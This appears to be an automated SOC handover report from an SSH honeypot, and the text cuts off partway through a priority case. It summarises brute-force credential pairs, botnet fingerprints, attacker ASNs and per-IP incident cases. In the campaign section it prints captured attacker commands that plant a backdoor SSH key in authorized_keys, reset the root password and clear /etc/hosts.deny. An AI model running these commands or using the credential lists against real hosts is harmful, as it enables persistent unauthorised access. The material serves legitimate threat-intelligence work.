# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-29 |
| **Generated At** | 2026-06-29T18:12:14Z |
| **Shift Time** | 18:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **246** |
| Confirmed Threats | **195** |
| False Positives Filtered | **51** (20.7%) |
| Unique Attacker IPs | **48** |
| Countries of Origin | **18** |
| High Severity Cases | **107** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **139** |
| Malware Samples Analyzed | **5** HIGH · **40** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **298** |
| Unique Credential Pairs | **228** |
| Unique Usernames | **21** |
| Unique Passwords | **222** |
| Successful Auth Pairs | **272** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 230 |
| `345gs5662d34` | 32 |
| `admin` | 5 |
| `GET / HTTP/1.1` | 3 |
| `*1` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 32 |
| `3245gs5662d34` | 31 |
| `LeitboGi0ro` | 6 |
| `Host: 129.80.119.236:23` | 3 |
| `$4` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 32 |
| `root` | `3245gs5662d34` | 25 |
| `root` | `LeitboGi0ro` | 6 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 3 |
| `*1` | `$4` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-06-29T14:55:09 |
| `root` | `123@@@` | `158.178.141.210` | 2026-06-29T14:55:10 |
| `root` | `postgres` | `45.198.224.120` | 2026-06-29T14:57:16 |
| `admin` | `Admin123!` | `186.96.158.180` | 2026-06-29T14:58:47 |
| `345gs5662d34` | `345gs5662d34` | `186.96.158.180` | 2026-06-29T14:58:49 |
| `admin` | `3245gs5662d34` | `186.96.158.180` | 2026-06-29T14:58:50 |
| `root` | `zaq1@WSX` | `222.247.32.186` | 2026-06-29T14:58:52 |
| `root` | `Tr123456` | `172.245.252.130` | 2026-06-29T14:59:06 |
| `345gs5662d34` | `345gs5662d34` | `172.245.252.130` | 2026-06-29T14:59:08 |
| `root` | `3245gs5662d34` | `172.245.252.130` | 2026-06-29T14:59:08 |
| `345gs5662d34` | `345gs5662d34` | `222.247.32.186` | 2026-06-29T14:59:10 |
| `test_user` | `12345` | `189.217.130.86` | 2026-06-29T15:00:17 |
| `345gs5662d34` | `345gs5662d34` | `189.217.130.86` | 2026-06-29T15:00:20 |
| `test_user` | `3245gs5662d34` | `189.217.130.86` | 2026-06-29T15:00:20 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.195.110.198` | 2026-06-29T15:02:06 |
| `*1` | `$4` | `35.195.110.198` | 2026-06-29T15:02:14 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2428` | `35.195.110.198` | 2026-06-29T15:02:16 |
| `root` | `Pa55@W0rd` | `50.6.228.111` | 2026-06-29T15:03:33 |
| `345gs5662d34` | `345gs5662d34` | `50.6.228.111` | 2026-06-29T15:03:34 |
| `root` | `3245gs5662d34` | `50.6.228.111` | 2026-06-29T15:03:34 |
| `root` | `p0o9i8u7y6t5` | `200.219.200.16` | 2026-06-29T15:04:09 |
| `345gs5662d34` | `345gs5662d34` | `200.219.200.16` | 2026-06-29T15:04:12 |
| `root` | `3245gs5662d34` | `200.219.200.16` | 2026-06-29T15:04:13 |
| `root` | `r3dhat123` | `45.205.1.42` | 2026-06-29T15:08:38 |
| `root` | `zaq1xsw2cde3` | `45.198.224.120` | 2026-06-29T15:10:11 |
| `root` | `123456liu` | `111.17.199.57` | 2026-06-29T15:12:16 |
| `345gs5662d34` | `345gs5662d34` | `111.17.199.57` | 2026-06-29T15:12:21 |
| `root` | `3245gs5662d34` | `111.17.199.57` | 2026-06-29T15:12:23 |
| `root` | `p@ssw0rd2025` | `45.207.196.123` | 2026-06-29T15:14:41 |
| `345gs5662d34` | `345gs5662d34` | `45.207.196.123` | 2026-06-29T15:14:45 |
| `root` | `3245gs5662d34` | `45.207.196.123` | 2026-06-29T15:14:46 |
| `root` | `1qaz2wsx3edc$rfv` | `183.91.11.36` | 2026-06-29T15:18:45 |
| `345gs5662d34` | `345gs5662d34` | `183.91.11.36` | 2026-06-29T15:18:49 |
| `root` | `3245gs5662d34` | `183.91.11.36` | 2026-06-29T15:18:51 |
| `root` | `spectrum` | `43.160.246.16` | 2026-06-29T15:19:19 |
| `345gs5662d34` | `345gs5662d34` | `43.160.246.16` | 2026-06-29T15:19:23 |
| `root` | `3245gs5662d34` | `43.160.246.16` | 2026-06-29T15:19:25 |
| `test` | `testing` | `185.242.3.195` | 2026-06-29T15:20:54 |
| `root` | `admin%123` | `172.200.228.35` | 2026-06-29T15:21:19 |
| `345gs5662d34` | `345gs5662d34` | `172.200.228.35` | 2026-06-29T15:21:21 |
| `root` | `3245gs5662d34` | `172.200.228.35` | 2026-06-29T15:21:21 |
| `root` | `Password@1` | `45.198.224.120` | 2026-06-29T15:23:25 |
| `root` | `Server_2023` | `10.0.0.73` | 2026-06-29T15:23:26 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-06-29T15:23:31 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-06-29T15:23:33 |
| `root` | `12341234` | `45.205.1.42` | 2026-06-29T15:23:36 |
| `root` | `spectrum` | `43.156.80.135` | 2026-06-29T15:24:01 |
| `345gs5662d34` | `345gs5662d34` | `43.156.80.135` | 2026-06-29T15:24:05 |
| `root` | `3245gs5662d34` | `43.156.80.135` | 2026-06-29T15:24:07 |
| `ftp-user` | `ftp-user` | `112.119.21.245` | 2026-06-29T15:26:14 |
| `345gs5662d34` | `345gs5662d34` | `112.119.21.245` | 2026-06-29T15:26:18 |
| `ftp-user` | `3245gs5662d34` | `112.119.21.245` | 2026-06-29T15:26:20 |
| `root` | `Antoine2017` | `10.0.0.73` | 2026-06-29T15:27:28 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.78.74.222` | 2026-06-29T15:31:13 |
| `*1` | `$4` | `34.78.74.222` | 2026-06-29T15:31:27 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4051` | `34.78.74.222` | 2026-06-29T15:31:29 |
| `ubuntu` | `user1234` | `45.198.224.120` | 2026-06-29T15:36:19 |
| `web1` | `newtest` | `45.205.1.42` | 2026-06-29T15:38:46 |
| `admin` | `admin` | `35.195.57.110` | 2026-06-29T15:44:45 |
| `root` | `asdf1234@` | `196.0.242.54` | 2026-06-29T15:46:15 |
| `345gs5662d34` | `345gs5662d34` | `196.0.242.54` | 2026-06-29T15:46:19 |
| `root` | `3245gs5662d34` | `196.0.242.54` | 2026-06-29T15:46:21 |
| `root` | `linux4me` | `10.0.0.73` | 2026-06-29T15:47:38 |
| `root` | `789632145` | `36.92.140.209` | 2026-06-29T15:48:25 |
| `345gs5662d34` | `345gs5662d34` | `36.92.140.209` | 2026-06-29T15:48:30 |
| `root` | `3245gs5662d34` | `36.92.140.209` | 2026-06-29T15:48:32 |
| `root` | `Zz#123456` | `200.219.200.16` | 2026-06-29T15:48:37 |
| `usuario` | `babygirl` | `45.198.224.120` | 2026-06-29T15:49:02 |
| `administrator` | `abc123` | `10.0.0.73` | 2026-06-29T15:50:42 |
| `administrator` | `3245gs5662d34` | `10.0.0.73` | 2026-06-29T15:50:46 |
| `root` | `A12345678!` | `68.183.178.130` | 2026-06-29T15:51:32 |
| `345gs5662d34` | `345gs5662d34` | `68.183.178.130` | 2026-06-29T15:51:36 |
| `root` | `3245gs5662d34` | `68.183.178.130` | 2026-06-29T15:51:38 |
| `root` | `yq123456.` | `121.237.10.191` | 2026-06-29T15:52:07 |
| `mysql` | `mysql` | `45.205.1.42` | 2026-06-29T15:53:55 |
| `root` | `m123456789` | `10.0.0.73` | 2026-06-29T15:54:07 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-06-29T15:55:11 |
| `root` | `123@@@` | `146.56.164.20` | 2026-06-29T15:55:12 |
| `root` | `Qazxsw123!!` | `10.0.0.73` | 2026-06-29T15:55:38 |
| `root` | `P@$$w0rd.123` | `121.237.10.191` | 2026-06-29T15:57:08 |
| `root` | `oracle2024` | `10.0.0.73` | 2026-06-29T15:57:23 |
| `test` | `testing` | `10.0.0.73` | 2026-06-29T16:01:15 |
| `root` | `QWEQWE!@#!@#` | `45.198.224.120` | 2026-06-29T16:02:15 |
| `root` | `123qwe!@` | `1.12.223.79` | 2026-06-29T16:05:56 |
| `prueba` | `prueba123` | `45.205.1.42` | 2026-06-29T16:08:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.53.189.16` | 2026-06-29T16:12:52 |
| `*1` | `$4` | `34.53.189.16` | 2026-06-29T16:13:06 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 215` | `34.53.189.16` | 2026-06-29T16:13:08 |
| `root` | `Primo` | `45.198.224.120` | 2026-06-29T16:14:56 |
| `root` | `2342w3e4r` | `42.200.78.166` | 2026-06-29T16:17:22 |
| `345gs5662d34` | `345gs5662d34` | `42.200.78.166` | 2026-06-29T16:17:26 |
| `root` | `3245gs5662d34` | `42.200.78.166` | 2026-06-29T16:17:28 |
| `minecraft` | `mcserver` | `181.188.176.242` | 2026-06-29T16:18:17 |
| `345gs5662d34` | `345gs5662d34` | `181.188.176.242` | 2026-06-29T16:18:21 |
| `minecraft` | `3245gs5662d34` | `181.188.176.242` | 2026-06-29T16:18:22 |
| `root` | `admin#2025` | `148.216.28.11` | 2026-06-29T16:20:16 |
| `345gs5662d34` | `345gs5662d34` | `148.216.28.11` | 2026-06-29T16:20:18 |
| `root` | `3245gs5662d34` | `148.216.28.11` | 2026-06-29T16:20:19 |
| `root` | `chinaidc147` | `220.80.223.144` | 2026-06-29T16:22:58 |
| `345gs5662d34` | `345gs5662d34` | `220.80.223.144` | 2026-06-29T16:23:02 |
| `root` | `3245gs5662d34` | `220.80.223.144` | 2026-06-29T16:23:03 |
| `root` | `Os@123456` | `10.0.0.73` | 2026-06-29T16:23:17 |
| `root` | `qq123` | `45.205.1.42` | 2026-06-29T16:24:04 |
| `reza` | `reza1234` | `10.0.0.73` | 2026-06-29T16:24:36 |
| `admin` | `admin` | `43.155.172.154` | 2026-06-29T16:24:38 |
| `admin` | `admin` | `130.12.180.51` | 2026-06-29T16:24:39 |
| `reza` | `3245gs5662d34` | `10.0.0.73` | 2026-06-29T16:24:40 |
| `root` | `!Q@W#E1q2w3e` | `10.0.0.73` | 2026-06-29T16:26:20 |
| `root` | `melissa` | `45.198.224.120` | 2026-06-29T16:27:55 |
| `root` | `maggie` | `10.0.0.73` | 2026-06-29T16:28:01 |
| `wangxin2` | `wangxin2` | `45.205.1.42` | 2026-06-29T16:39:04 |
| `zhangwei3` | `zhangwei3` | `45.198.224.120` | 2026-06-29T16:40:46 |
| `root` | `22091986` | `10.0.0.73` | 2026-06-29T16:47:05 |
| `root` | `22071990` | `10.0.0.73` | 2026-06-29T16:47:09 |
| `root` | `21081985` | `10.0.0.73` | 2026-06-29T16:47:12 |
| `root` | `21071992` | `10.0.0.73` | 2026-06-29T16:47:16 |
| `root` | `20051989` | `10.0.0.73` | 2026-06-29T16:47:18 |
| `root` | `20041990` | `10.0.0.73` | 2026-06-29T16:47:21 |
| `root` | `1Dragon` | `10.0.0.73` | 2026-06-29T16:47:25 |
| `root` | `19091990` | `10.0.0.73` | 2026-06-29T16:47:28 |
| `root` | `19031987` | `10.0.0.73` | 2026-06-29T16:47:32 |
| `root` | `18081988` | `10.0.0.73` | 2026-06-29T16:47:35 |
| `root` | `18041991` | `10.0.0.73` | 2026-06-29T16:47:39 |
| `root` | `18011988` | `10.0.0.73` | 2026-06-29T16:47:42 |
| `root` | `17061991` | `10.0.0.73` | 2026-06-29T16:47:44 |
| `root` | `15091989` | `10.0.0.73` | 2026-06-29T16:47:47 |
| `root` | `15081990` | `10.0.0.73` | 2026-06-29T16:47:51 |
| `root` | `15071983` | `10.0.0.73` | 2026-06-29T16:47:54 |
| `root` | `14091990` | `10.0.0.73` | 2026-06-29T16:47:58 |
| `root` | `14081990` | `10.0.0.73` | 2026-06-29T16:48:00 |
| `root` | `14041992` | `10.0.0.73` | 2026-06-29T16:48:02 |
| `root` | `14031989` | `10.0.0.73` | 2026-06-29T16:48:05 |
| `root` | `123qwert` | `10.0.0.73` | 2026-06-29T16:48:09 |
| `root` | `12345qwer` | `10.0.0.73` | 2026-06-29T16:48:11 |
| `root` | `12021991` | `10.0.0.73` | 2026-06-29T16:48:14 |
| `root` | `11101986` | `10.0.0.73` | 2026-06-29T16:48:17 |
| `root` | `11081988` | `10.0.0.73` | 2026-06-29T16:48:20 |
| `root` | `11061989` | `10.0.0.73` | 2026-06-29T16:48:24 |
| `root` | `11041991` | `10.0.0.73` | 2026-06-29T16:48:26 |
| `root` | `11011989` | `10.0.0.73` | 2026-06-29T16:48:29 |
| `root` | `1018` | `10.0.0.73` | 2026-06-29T16:48:32 |
| `root` | `1015` | `10.0.0.73` | 2026-06-29T16:48:35 |
| `root` | `10121985` | `10.0.0.73` | 2026-06-29T16:48:38 |
| `root` | `09091986` | `10.0.0.73` | 2026-06-29T16:48:41 |
| `root` | `09081988` | `10.0.0.73` | 2026-06-29T16:48:43 |
| `root` | `09051986` | `10.0.0.73` | 2026-06-29T16:48:48 |
| `root` | `08071988` | `10.0.0.73` | 2026-06-29T16:48:50 |
| `root` | `08011986` | `10.0.0.73` | 2026-06-29T16:48:53 |
| `root` | `07101987` | `10.0.0.73` | 2026-06-29T16:48:55 |
| `root` | `07071985` | `10.0.0.73` | 2026-06-29T16:48:58 |
| `root` | `0660` | `10.0.0.73` | 2026-06-29T16:49:01 |
| `root` | `06011988` | `10.0.0.73` | 2026-06-29T16:49:05 |
| `root` | `05031991` | `10.0.0.73` | 2026-06-29T16:49:10 |
| `root` | `05021987` | `10.0.0.73` | 2026-06-29T16:49:12 |
| `root` | `04061984` | `10.0.0.73` | 2026-06-29T16:49:15 |
| `root` | `04051985` | `10.0.0.73` | 2026-06-29T16:49:19 |
| `root` | `02101973` | `10.0.0.73` | 2026-06-29T16:49:23 |
| `root` | `02061981` | `10.0.0.73` | 2026-06-29T16:49:25 |
| `root` | `02061972` | `10.0.0.73` | 2026-06-29T16:49:28 |
| `root` | `02041973` | `10.0.0.73` | 2026-06-29T16:49:32 |
| `root` | `02011979` | `10.0.0.73` | 2026-06-29T16:49:35 |
| `root` | `workout` | `10.0.0.73` | 2026-06-29T16:49:38 |
| `root` | `wonderboy` | `10.0.0.73` | 2026-06-29T16:49:40 |
| `root` | `wetter` | `10.0.0.73` | 2026-06-29T16:49:44 |
| `root` | `werdna` | `10.0.0.73` | 2026-06-29T16:49:47 |
| `root` | `vvvv` | `10.0.0.73` | 2026-06-29T16:49:49 |
| `root` | `voyager1` | `10.0.0.73` | 2026-06-29T16:49:52 |
| `root` | `trustme` | `10.0.0.73` | 2026-06-29T16:49:55 |
| `root` | `toonarmy` | `10.0.0.73` | 2026-06-29T16:49:57 |
| `root` | `Tigger` | `10.0.0.73` | 2026-06-29T16:50:00 |
| `root` | `thrasher` | `10.0.0.73` | 2026-06-29T16:50:03 |
| `root` | `terra` | `10.0.0.73` | 2026-06-29T16:50:07 |
| `root` | `swoosh` | `10.0.0.73` | 2026-06-29T16:50:10 |
| `root` | `supra` | `10.0.0.73` | 2026-06-29T16:50:13 |
| `root` | `stigmata` | `10.0.0.73` | 2026-06-29T16:50:16 |
| `root` | `stayout` | `10.0.0.73` | 2026-06-29T16:50:21 |
| `root` | `status` | `10.0.0.73` | 2026-06-29T16:50:24 |
| `root` | `sperma` | `10.0.0.73` | 2026-06-29T16:50:28 |
| `root` | `sixty9` | `10.0.0.73` | 2026-06-29T16:50:31 |
| `root` | `sexybabe` | `10.0.0.73` | 2026-06-29T16:50:33 |
| `root` | `sergbest` | `10.0.0.73` | 2026-06-29T16:50:37 |
| `root` | `senna` | `10.0.0.73` | 2026-06-29T16:50:40 |
| `root` | `scuba1` | `10.0.0.73` | 2026-06-29T16:50:42 |
| `root` | `scrapper` | `10.0.0.73` | 2026-06-29T16:50:45 |
| `root` | `sammy123` | `10.0.0.73` | 2026-06-29T16:50:49 |
| `root` | `rugger` | `10.0.0.73` | 2026-06-29T16:50:51 |
| `root` | `royalty` | `10.0.0.73` | 2026-06-29T16:50:54 |
| `root` | `ringo` | `10.0.0.73` | 2026-06-29T16:50:57 |
| `root` | `restart` | `10.0.0.73` | 2026-06-29T16:51:01 |
| `root` | `readers` | `10.0.0.73` | 2026-06-29T16:51:04 |
| `root` | `raleigh` | `10.0.0.73` | 2026-06-29T16:51:07 |
| `root` | `rage` | `10.0.0.73` | 2026-06-29T16:51:09 |
| `root` | `pictures` | `10.0.0.73` | 2026-06-29T16:51:12 |
| `root` | `peterbil` | `10.0.0.73` | 2026-06-29T16:51:16 |
| `root` | `patrici` | `10.0.0.73` | 2026-06-29T16:51:18 |
| `root` | `pancake` | `10.0.0.73` | 2026-06-29T16:51:22 |
| `root` | `outback` | `10.0.0.73` | 2026-06-29T16:51:25 |
| `root` | `norris` | `10.0.0.73` | 2026-06-29T16:51:28 |
| `root` | `normandy` | `10.0.0.73` | 2026-06-29T16:51:31 |
| `root` | `nevermore` | `10.0.0.73` | 2026-06-29T16:51:34 |
| `root` | `needles` | `10.0.0.73` | 2026-06-29T16:51:36 |
| `root` | `musical` | `10.0.0.73` | 2026-06-29T16:51:40 |
| `root` | `mooney` | `10.0.0.73` | 2026-06-29T16:51:42 |
| `root` | `maxdog` | `10.0.0.73` | 2026-06-29T16:51:45 |
| `root` | `MASTER` | `10.0.0.73` | 2026-06-29T16:51:50 |
| `root` | `madmad` | `10.0.0.73` | 2026-06-29T16:51:53 |
| `root` | `lumina` | `10.0.0.73` | 2026-06-29T16:51:56 |
| `root` | `luckyone` | `10.0.0.73` | 2026-06-29T16:51:59 |
| `root` | `lillie` | `10.0.0.73` | 2026-06-29T16:52:01 |
| `root` | `leigh` | `10.0.0.73` | 2026-06-29T16:52:04 |
| `root` | `kirkland` | `10.0.0.73` | 2026-06-29T16:52:08 |
| `chezhang` | `chezhang` | `185.242.3.195` | 2026-06-29T16:52:11 |
| `root` | `kahlua` | `10.0.0.73` | 2026-06-29T16:52:12 |
| `root` | `junkmail` | `10.0.0.73` | 2026-06-29T16:52:14 |
| `root` | `Joshua` | `10.0.0.73` | 2026-06-29T16:52:18 |
| `root` | `josephin` | `10.0.0.73` | 2026-06-29T16:52:21 |
| `root` | `Jordan23` | `10.0.0.73` | 2026-06-29T16:52:25 |
| `root` | `jeannie` | `10.0.0.73` | 2026-06-29T16:52:28 |
| `root` | `javelin` | `10.0.0.73` | 2026-06-29T16:52:31 |
| `root` | `honor` | `10.0.0.73` | 2026-06-29T16:52:34 |
| `info` | `info` | `45.148.10.239` | 2026-06-29T16:52:35 |
| `root` | `holein1` | `10.0.0.73` | 2026-06-29T16:52:39 |
| `root` | `harbor` | `10.0.0.73` | 2026-06-29T16:52:42 |
| `root` | `grisha` | `10.0.0.73` | 2026-06-29T16:52:46 |
| `root` | `gina` | `10.0.0.73` | 2026-06-29T16:52:49 |
| `root` | `gatit` | `10.0.0.73` | 2026-06-29T16:52:51 |
| `root` | `fireblad` | `10.0.0.73` | 2026-06-29T16:52:54 |
| `root` | `fellatio` | `10.0.0.73` | 2026-06-29T16:52:57 |
| `root` | `esquire` | `10.0.0.73` | 2026-06-29T16:53:00 |
| `root` | `errors` | `10.0.0.73` | 2026-06-29T16:53:02 |
| `root` | `emmett` | `10.0.0.73` | 2026-06-29T16:53:05 |
| `root` | `elvisp` | `10.0.0.73` | 2026-06-29T16:53:07 |
| `root` | `drum` | `10.0.0.73` | 2026-06-29T16:53:10 |
| `root` | `driller` | `10.0.0.73` | 2026-06-29T16:53:14 |
| `root` | `dragonfl` | `10.0.0.73` | 2026-06-29T16:53:17 |
| `root` | `dingle` | `10.0.0.73` | 2026-06-29T16:53:20 |
| `root` | `crackers` | `10.0.0.73` | 2026-06-29T16:53:23 |
| `root` | `corwin` | `10.0.0.73` | 2026-06-29T16:53:26 |
| `root` | `collie` | `10.0.0.73` | 2026-06-29T16:53:28 |
| `root` | `checker` | `10.0.0.73` | 2026-06-29T16:53:32 |
| `root` | `cartoons` | `10.0.0.73` | 2026-06-29T16:53:35 |
| `root` | `bungle` | `10.0.0.73` | 2026-06-29T16:53:38 |
| `root` | `budgie` | `10.0.0.73` | 2026-06-29T16:53:40 |
| `root` | `qwe123$%` | `45.198.224.120` | 2026-06-29T16:53:42 |
| `root` | `boomer1` | `10.0.0.73` | 2026-06-29T16:53:44 |
| `root` | `body` | `10.0.0.73` | 2026-06-29T16:53:47 |
| `root` | `blue1234` | `10.0.0.73` | 2026-06-29T16:53:49 |
| `root` | `biit` | `10.0.0.73` | 2026-06-29T16:53:52 |
| `root` | `bigguns` | `10.0.0.73` | 2026-06-29T16:53:56 |
| `root` | `barry1` | `10.0.0.73` | 2026-06-29T16:53:58 |
| `root` | `audio` | `10.0.0.73` | 2026-06-29T16:54:02 |
| `root` | `atticus` | `10.0.0.73` | 2026-06-29T16:54:05 |
| `root` | `atlas` | `10.0.0.73` | 2026-06-29T16:54:08 |
| `root` | `q1w2e3` | `45.205.1.42` | 2026-06-29T16:54:11 |
| `root` | `angus1` | `10.0.0.73` | 2026-06-29T16:54:11 |
| `root` | `Anai` | `10.0.0.73` | 2026-06-29T16:54:14 |
| `root` | `alisa` | `10.0.0.73` | 2026-06-29T16:54:16 |
| `root` | `aikman` | `10.0.0.73` | 2026-06-29T16:54:20 |
| `root` | `abacab` | `10.0.0.73` | 2026-06-29T16:54:23 |
| `root` | `4711` | `10.0.0.73` | 2026-06-29T16:54:27 |
| `root` | `321678` | `10.0.0.73` | 2026-06-29T16:54:29 |
| `root` | `31101987` | `10.0.0.73` | 2026-06-29T16:54:32 |
| `root` | `30091989` | `10.0.0.73` | 2026-06-29T16:54:35 |
| `root` | `30031986` | `10.0.0.73` | 2026-06-29T16:54:38 |
| `root` | `30011987` | `10.0.0.73` | 2026-06-29T16:54:41 |
| `root` | `29061988` | `10.0.0.73` | 2026-06-29T16:54:44 |
| `root` | `28061988` | `10.0.0.73` | 2026-06-29T16:54:47 |
| `root` | `27061983` | `10.0.0.73` | 2026-06-29T16:54:49 |
| `root` | `27031986` | `10.0.0.73` | 2026-06-29T16:54:53 |
| `root` | `27021990` | `10.0.0.73` | 2026-06-29T16:54:56 |
| `root` | `26071989` | `10.0.0.73` | 2026-06-29T16:54:58 |
| `root` | `26071986` | `10.0.0.73` | 2026-06-29T16:55:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **246** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 91 |
| Go SSH scanner | 25 |
| Paramiko (Python) | 8 |
| Nmap scanner | 7 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 71 | 23 |
| `16443846184e...` | Generic scanner | 22 | 4 |
| `6372ee695756...` | Modern SSH client | 8 | 2 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 71 | 23 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 22 | 4 | Generic scanner |
| `95420f9d932d...` | libssh | 15 | 6 | — |
| `6372ee695756...` | Paramiko (Python) | 8 | 2 | Modern SSH client |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 22 | 20 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Mk6Tire02aYz"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `1.12.223.79`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `121.237.10.191`, `42.200.78.166`, `181.188.176.242`, `43.160.246.16`, `196.0.242.54`, `50.6.228.111`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **48** |
| Unique ASNs | **33** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 6 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 3 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (107)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6c53181397ed

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-06-29 14:55 |
| **Last Seen** | 2026-06-29 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 14:55:07` | `cowrie.session.connect` |
| `2026-06-29 14:55:07` | `cowrie.client.version` |
| `2026-06-29 14:55:08` | `cowrie.client.kex` |
| `2026-06-29 14:55:09` | `cowrie.login.success` |
| `2026-06-29 14:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31824be1d26d

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-06-29 14:55 |
| **Last Seen** | 2026-06-29 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
